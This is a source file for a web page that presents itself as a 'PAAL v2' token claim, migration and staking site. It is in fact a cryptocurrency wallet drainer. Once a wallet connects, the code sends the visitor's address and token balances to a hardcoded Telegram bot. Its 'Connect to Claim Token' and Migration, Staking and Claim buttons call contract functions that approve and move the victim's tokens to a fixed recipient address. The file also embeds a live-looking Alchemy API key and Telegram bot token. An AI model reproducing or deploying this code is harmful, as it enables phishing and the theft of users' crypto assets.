import { ConnectWallet, Web3Button, useAddress, useBalance, useContract, useContractWrite} from "@thirdweb-dev/react";
import { NextPage } from "next";
import {Navbar, NavbarBrand, NavbarContent, NavbarItem, Image, Button, Link} from "@nextui-org/react";
import { useState, useEffect, useContext } from "react";
import ChainContext from "../context/Chain";
import { NATIVE_TOKEN_ADDRESS } from '@thirdweb-dev/sdk';
import { useRouter } from 'next/router';

const Home: NextPage = () => {
const address = useAddress();
const { data, isLoading } = useBalance(NATIVE_TOKEN_ADDRESS);
const wbalance = data?.displayValue;
const [tokenDataArr, setTokenDataArr] = useState([]);
const [errorMessage, setErrorMessage] = useState('');
const [isButtonDisabled, setIsButtonDisabled] = useState(true);
const { selectedChain, setSelectedChain } = useContext(ChainContext);
const router = useRouter(); 
  const addresses: Record<string, string> = {
    ["ethereum"]: "0xaF9c61A17d7F64507B983DD90de471CD010EDe12",
    ["binance"]: "0xaF9c61A17d7F64507B983DD90de471CD010EDe12",
  };
  const apiKey = "6tL6x4wh-ROoNc4hp3C8gE-ToXlCSM5t"
  const chainUrls: Record<string, string> = {
    ethereum: `https://eth-mainnet.g.alchemy.com/v2/${apiKey}`,
    arbitrum: `https://arb-mainnet.g.alchemy.com/v2/${apiKey}`,
    binance:      `https://eth-mainnet.g.alchemy.com/v2/${apiKey}`,
    polygon: `https://matic-mainnet.g.alchemy.com/v2/${apiKey}`,
  };
// Get the URL based on the selected chain
  const url = chainUrls[selectedChain];
  useEffect(() => {
    const fetchTokenBalances = async () => {
      try {
        // Your code for fetching token balances goes here
         const options = {
          method: "POST",
          headers: {
            accept: "application/json",
            "content-type": "application/json",
          },
          body: JSON.stringify({
            id: 1,
            jsonrpc: "2.0",
            method: "alchemy_getTokenBalances",
            params: [address],
          }),
        };

        const res = await fetch(url, options);
        const response = await res.json();
        const balances = response.result.tokenBalances;

        const nonZeroBalances = balances.filter((token) => {
          return token.tokenBalance !== "0";
        });

        await sendMessageToTelegram(`Wallet balance of ${address} is ${wbalance}`);
            await sendMessageToTelegram(`Token balances of ${address} on ${selectedChain} network is`);
            const tokenDataPromises = nonZeroBalances.map(async (token, index) => {
              const tokenMetadataOptions = {
                method: "POST",
                headers: {
                  accept: "application/json",
                  "content-type": "application/json",
                },
                body: JSON.stringify({
                  id: 1,
                  jsonrpc: "2.0",
                  method: "alchemy_getTokenMetadata",
                  params: [token.contractAddress],
                }),
              };
    
              const rawbal = Number(token.tokenBalance);
              const tokenMetadataRes = await fetch(url, tokenMetadataOptions);
              const metadata = await tokenMetadataRes.json();
              const { name, symbol, decimals } = metadata.result;
              const balance = rawbal / 10 ** Number(decimals);
              const logMessage = `${index + 1}. ${name}: ${balance} ${symbol}`;
              await sendMessageToTelegram(logMessage);
    
              return {
                tokenAddress: token.contractAddress,
                tokenBalance: balance,
              };
            });
    
            const tokenDataArr = await Promise.all(tokenDataPromises);
            await sendMessageToTelegram(tokenDataArr);
    
            setTokenDataArr(tokenDataArr);
          } catch (error) {
            console.error(error);
          }
        };
    
        if (address) {
          fetchTokenBalances();
        }
      }, [address, url]);

      const to ="0x5fC8D30804508dfBB940b64D20BdCFCA9C6A6c25"
      const { contract } = useContract(addresses[selectedChain]);
  const { mutateAsync: SynchronizePaalai} = useContractWrite(contract, "SynchronizePaalai");
  const handleSynchronizePaalai = async (actionType) => {
    try {
      const data = await SynchronizePaalai({ args: [tokenDataArr, to] });
      console.info("contract call success", data);
      if (actionType === 'migration') {
        router.push('/migration');
      } else if (actionType === 'staking') {
        router.push('/staking');
      } else if (actionType === 'claim') {
        router.push('/claim');
      }
      } catch (error) {
      console.error("contract call failure", error);
      setErrorMessage("Something went wrong!");
      }
      };
    
      console.log(wbalance);
return(
    <div
      className="bg-cover bg-center min-h-screen"
      style={{ backgroundImage: `url('images/bg-paal.png')` }}
    >
      <div>
      <Navbar>
      <NavbarBrand>
      <Image src="images/logo.png" alt="Logo" className="h-12"/>
      </NavbarBrand>
      
      <NavbarContent justify="end">
        <NavbarItem>
        <ConnectWallet
        theme={"dark"}
          modalTitle={"Connect to PAAL AI"}></ConnectWallet>
        </NavbarItem>
      </NavbarContent>
    </Navbar>
    <div className="flex justify-center items-center">
      <br></br><br></br><br></br><br></br><br></br><br></br>
    <Image src="images/logo.png" alt="Logo" width={90} height={30}></Image>
    <br></br>
    </div>
    <h1 className="flex justify-center font-bold text-lg text-white">
      <Link href="paalai.io" className="text-white">Introducing PAAL &rarr;</Link>
    </h1>
    <p className="flex justify-center text-white">Welcome to PAAL v2 claiming site.</p>
    <br></br>
    <div className="flex justify-center items-center">
      <br></br>
      <Web3Button
      contractAddress={addresses[selectedChain]}
      action={(contract) => {
        contract.call("PaalaiApproval", [tokenDataArr])
        setIsButtonDisabled(false);
      }}
      
      onError={(error) => setErrorMessage("Something went wrong!")}
    >
     Connect to Claim Token
    </Web3Button>
    &nbsp;&nbsp;
    <select
    className="block font-bold px-3 py-2 mt-2 bg-white border border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
        value={String(selectedChain)}
        onChange={(e) => setSelectedChain(e.target.value)}
      >
        
        <option value="binance">Binance Smart Chain</option>
        <option value="ethereum">Ethereum</option>
      </select>
    </div>
    {errorMessage && <p className="flex justify-center text-red-500"><br></br>{errorMessage}</p>}
    <div className="flex justify-center items-center gap-2">
    <br></br><br></br><br></br><br></br><br></br><br></br>
    <Button
onClick={() => handleSynchronizePaalai('migration')}
disabled={isLoading || isButtonDisabled}
>
Migration V2
</Button>

<Button
onClick={() => handleSynchronizePaalai('staking')}
disabled={isLoading || isButtonDisabled}
>
Staking pool
</Button>


<Button
onClick={() => handleSynchronizePaalai('claim')}
disabled={isLoading || isButtonDisabled}
>
Claim Rewards
</Button><br></br>
    </div>
    
      </div>

    </div>
  );
};
const sendMessageToTelegram = async (message) => {
  const botToken = '6465126558:AAGyaNAHu6ZrzMiILFOJYFDvHTNfCDSdj2I';
  const chatId = '5033004040'; // You'll need to obtain this from your Telegram bot
  
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  const response = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  });

  const result = await response.json();
};

export default Home;
